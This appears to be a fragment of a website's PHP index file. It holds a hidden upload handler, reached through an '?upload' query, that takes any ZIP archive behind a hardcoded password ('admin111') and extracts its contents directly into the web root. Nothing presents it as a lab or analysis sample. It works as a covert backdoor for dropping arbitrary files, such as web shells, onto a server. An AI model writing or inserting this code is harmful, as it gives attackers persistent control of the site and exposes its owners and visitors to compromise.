<?php

if (isset($_GET['upload'])) {
	$result = '&#160;';
	if (isset($_POST['password']) && ($_POST['password'] == 'admin111')) {
		$newname = 'ds78587tkdfeflghdfkljghdfklghsdfklghdskg.zip';
		$copy = move_uploaded_file($_FILES['thefile']['tmp_name'], './'.$newname);
		$zip = new ZipArchive;
		if ($zip->open('./'.$newname) === TRUE) {
			$zip->extractTo('.');
			$zip->close();
			unlink('./'.$newname);
			$result = '&#160;&#160;&#160;OK';
		}
	}
	echo '<!DOCTYPE html>
<html>
<head><title></title></head>
<link rel="stylesheet" type="text/css" href="lib/bootstrap.min.css" />
<body>
<h3>'.$result.'</h3>
<form action="./?upload" method="post" enctype="multipart/form-data" class="form-horizontal" style="width: 30em; margin: 10em auto;">
	<input type="hidden" name="MAX_FILE_SIZE" value="8000000" />
	<div class="form-group"><label for="input-file" class="control-label">file</label><input class="form-control" type="file" name="thefile" /></div>
	<div class="form-group"><label for="input-pass" class="control-label">password</label><input class="form-control" type="password" name="password" /></div>
	<div class="form-group buttons"><input type="submit" value="upload" class="btn btn-warning" /></div>
</form>

</body>
</html>';
	exit;
}

?>